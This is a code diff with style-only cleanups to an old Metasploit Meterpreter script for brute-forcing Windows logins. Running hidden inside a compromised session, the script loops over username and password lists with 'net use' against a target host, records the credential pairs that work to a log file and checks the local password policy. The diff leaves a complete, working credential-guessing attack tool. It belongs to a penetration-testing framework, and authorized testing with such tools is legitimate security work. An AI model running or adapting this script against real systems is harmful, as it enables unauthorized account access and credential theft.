@@ -1,18 +1,18 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 @@exec_opts = Rex::Parser::Arguments.new(
-  "-h"  => [ false,  "\tHelp menu."],
+  "-h"  => [ false, "\tHelp menu."],
   "-t"  => [ true,  "\tTarget IP Address"],
   "-p"  => [ true,  "\tPassword List"],
-  "-cp" => [ false,  "\tCheck Local Machine Password Policy"],
+  "-cp" => [ false, "\tCheck Local Machine Password Policy"],
   "-L"  => [ true,  "\tUsername List to be brute forced"],
   "-l"  => [ true,  "\tLogin name to be brute forced"]
 )
@@ -31,13 +31,13 @@ session = client
 ################## Function Definition ##################
 # Function for checking the password policy of current system.
 # This policy may resemble the policy of other servers in the
-#target enviroment.
+# target enviroment.
 def chkpolicy(session)
   print_status("Checking password policy...")
   output = []
   begin
-    r = session.sys.process.execute("net accounts", nil, {'Hidden' => true, 'Channelized' => true})
-    while(d = r.channel.read)
+    r = session.sys.process.execute("net accounts", nil, 'Hidden' => true, 'Channelized' => true)
+    while (d = r.channel.read)
       output << d
     end
     r.channel.close
@@ -68,7 +68,7 @@ end
 #--------------------------------------------------------
 
 # Function for brute forcing passwords using windows native tools
-def passbf(session,passlist,target,user,opt,logfile)
+def passbf(session, passlist, target, user, opt, logfile)
   print_status("Running Brute force attack against #{user}")
   print_status("Successfull Username and Password pairs are being saved in #{logfile}")
   result = []
@@ -77,7 +77,7 @@ def passbf(session,passlist,target,user,opt,logfile)
   a = []
   i = 0
   if opt == 1
-    if not ::File.exist?(user)
+    if !::File.exist?(user)
       raise "Usernames List File does not exists!"
     else
       user = ::File.open(user, "r")
@@ -92,8 +92,8 @@ def passbf(session,passlist,target,user,opt,logfile)
           print_status("Trying #{u.chomp} #{line.chomp}")
 
           # Command for testing local login credentials
-          r = session.sys.process.execute("cmd /c net use \\\\#{target} #{line.chomp} /u:#{u.chomp}", nil, {'Hidden' => true, 'Channelized' => true})
-          while(d = r.channel.read)
+          r = session.sys.process.execute("cmd /c net use \\\\#{target} #{line.chomp} /u:#{u.chomp}", nil, 'Hidden' => true, 'Channelized' => true)
+          while (d = r.channel.read)
             output << d
           end
           r.channel.close
@@ -103,9 +103,9 @@ def passbf(session,passlist,target,user,opt,logfile)
           result = output.to_s.scan(/The\scommand\scompleted\ssuccessfully/)
           if result.length == 1
             print_status("\tUser: #{u.chomp} pass: #{line.chomp} found")
-            file_local_write(logfile,"User: #{u.chomp} pass: #{line.chomp}")
-            r = session.sys.process.execute("cmd /c net use \\\\#{target} /delete", nil, {'Hidden' => true, 'Channelized' => true})
-            while(d = r.channel.read)
+            file_local_write(logfile, "User: #{u.chomp} pass: #{line.chomp}")
+            r = session.sys.process.execute("cmd /c net use \\\\#{target} /delete", nil, 'Hidden' => true, 'Channelized' => true)
+            while (d = r.channel.read)
               output << d
             end
             output.clear
@@ -117,7 +117,6 @@ def passbf(session,passlist,target,user,opt,logfile)
         rescue ::Exception => e
           print_status("The following Error was encountered: #{e.class} #{e}")
         end
-
       end
       passfnd = 1
     end
@@ -128,24 +127,24 @@ end
 #--------------------------------------------------------
 # Function for creating log file
 def logme(target)
-
   # Create Filename info to be appended to  files
   filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
   # Create a directory for the logs
-  logs = ::File.join(Msf::Config.log_directory,'scripts', 'winbf')
+  logs = ::File.join(Msf::Config.log_directory, 'scripts', 'winbf')
 
   # Create the log directory
   ::FileUtils.mkdir_p(logs)
 
-  #logfile name
+  # logfile name
   dest = logs + "/" + target + filenameinfo
 
   dest
 end
+
 #--------------------------------------------------------
 #
-##check for proper Meterpreter Platform
+# #check for proper Meterpreter Platform
 def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
@@ -155,7 +154,7 @@ unsupported if client.platform !~ /win32|win64/i
 ################## MAIN ##################
 
 # Parsing of Options
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-l"
     user << val
@@ -170,33 +169,29 @@ unsupported if client.platform !~ /win32|win64/i
   when "-p"
 
     passlist = val
-    if not ::File.exist?(passlist)
-      raise "Password File does not exists!"
-    end
+    raise "Password File does not exists!" unless ::File.exist?(passlist)
   when "-t"
     target = val
   when "-h"
-    print("Windows Login Brute Force Meterpreter Script\n" +
+    print("Windows Login Brute Force Meterpreter Script\n" \
       "Usage:\n" +
       @@exec_opts.usage)
     helpcall = 1
   end
-
-}
+end
 
 # Execution of options selected
-if user.length > 0 && passlist != nil && target != nil
+if !user.empty? && !passlist.nil? && !target.nil?
 
-  passbf(session,passlist,target,user,ulopt,logme(target))
+  passbf(session, passlist, target, user, ulopt, logme(target))
 
-elsif userlist != nil && passlist != nil && target != nil
+elsif !userlist.nil? && !passlist.nil? && !target.nil?
 
-  passbf(session,passlist,target,userlist,ulopt,logme(target))
+  passbf(session, passlist, target, userlist, ulopt, logme(target))
 
 elsif helpcall == 0
-  print("Windows Login Brute Force Meterpreter Script\n" +
+  print("Windows Login Brute Force Meterpreter Script\n" \
     "Usage:\n" +
     @@exec_opts.usage)
 
 end
-
